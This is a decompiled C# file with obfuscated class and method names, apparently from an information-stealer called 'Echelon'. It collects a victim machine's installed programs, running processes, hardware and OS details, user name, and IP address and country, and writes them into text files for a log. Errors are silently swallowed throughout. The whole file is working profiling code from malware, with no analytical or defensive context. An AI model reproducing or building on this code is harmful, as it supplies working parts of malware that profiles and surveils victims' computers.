using Echelon;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Text;
using System.Windows.Forms;

internal class ak
{
	public static void a(string iq)
	{
		g(iq);
		using (StreamWriter streamWriter = new StreamWriter(iq + "\\Programms.txt", append: false, Encoding.Default))
		{
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
				string[] subKeyNames = registryKey.GetSubKeyNames();
				for (int i = 0; i < subKeyNames.Length; i++)
				{
					string text = registryKey.OpenSubKey(subKeyNames[i]).GetValue("DisplayName") as string;
					if (text != null)
					{
						streamWriter.WriteLine(text);
					}
				}
			}
			catch
			{
			}
		}
		try
		{
			using (StreamWriter streamWriter2 = new StreamWriter(iq + "\\Processes.txt", append: false, Encoding.Default))
			{
				Process[] processes = Process.GetProcesses();
				for (int j = 0; j < processes.Length; j++)
				{
					streamWriter2.WriteLine(processes[j].ProcessName.ToString());
				}
			}
		}
		catch
		{
		}
	}

	public static string b()
	{
		try
		{
			string text = string.Empty;
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController"))
			{
				foreach (ManagementObject item in managementObjectSearcher.Get())
				{
					text = text + item["Description"].ToString() + " ";
				}
			}
			return (!string.IsNullOrEmpty(text)) ? text : "N/A";
		}
		catch
		{
			return "Unknown";
		}
	}

	public static string c()
	{
		try
		{
			ManagementScope scope = new ManagementScope();
			ObjectQuery query = new ObjectQuery("SELECT Capacity FROM Win32_PhysicalMemory");
			ManagementObjectCollection managementObjectCollection = new ManagementObjectSearcher(scope, query).Get();
			long num = 0L;
			foreach (ManagementObject item in managementObjectCollection)
			{
				long num2 = Convert.ToInt64(item["Capacity"]);
				num += num2;
			}
			return (num / 1024 / 1024).ToString();
		}
		catch
		{
			return "Unknown";
		}
	}

	public static string d()
	{
		foreach (ManagementObject item in new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get())
		{
			try
			{
				return ((string)item["Caption"]).Trim() + ", " + (string)item["Version"] + ", " + (string)item["OSArchitecture"];
			}
			catch
			{
			}
		}
		return "BIOS Maker: Unknown";
	}

	public static string e()
	{
		try
		{
			ManagementObjectCollection instances = new ManagementClass("Win32_ComputerSystem").GetInstances();
			string result = string.Empty;
			foreach (ManagementObject item in instances)
			{
				result = (string)item["Name"];
			}
			return result;
		}
		catch
		{
			return "Unknown";
		}
	}

	public static string f()
	{
		try
		{
			ManagementObjectCollection instances = new ManagementClass("Win32_Processor").GetInstances();
			string result = string.Empty;
			foreach (ManagementObject item in instances)
			{
				result = (string)item["Name"];
			}
			return result;
		}
		catch
		{
			return "Unknown";
		}
	}

	public static void g(string ir)
	{
		ComputerInfo computerInfo = new ComputerInfo();
		Size size = Screen.PrimaryScreen.Bounds.Size;
		try
		{
			using (StreamWriter streamWriter = new StreamWriter(ir + "\\PcInfo.txt", append: false, Encoding.Default))
			{
				string[] obj = new string[24]
				{
					"OC verison - ",
					Environment.OSVersion?.ToString(),
					" | ",
					computerInfo.OSFullName,
					"\nMachineName - ",
					Environment.MachineName,
					"/",
					Environment.UserName,
					"\nResolution - ",
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null
				};
				Size size2 = size;
				obj[9] = size2.ToString();
				obj[10] = "\nCurrent time Utc - ";
				obj[11] = DateTime.UtcNow.ToString();
				obj[12] = "\nCurrent time - ";
				obj[13] = DateTime.Now.ToString();
				obj[14] = "\nCPU - ";
				obj[15] = f();
				obj[16] = "\nRAM - ";
				obj[17] = c();
				obj[18] = "\nGPU - ";
				obj[19] = b();
				obj[20] = "\n\n\nIP Geolocation: ";
				obj[21] = Global.IP;
				obj[22] = " ";
				obj[23] = Global.Country();
				streamWriter.WriteLine(string.Concat(obj));
				streamWriter.Close();
			}
		}
		catch
		{
		}
	}
}
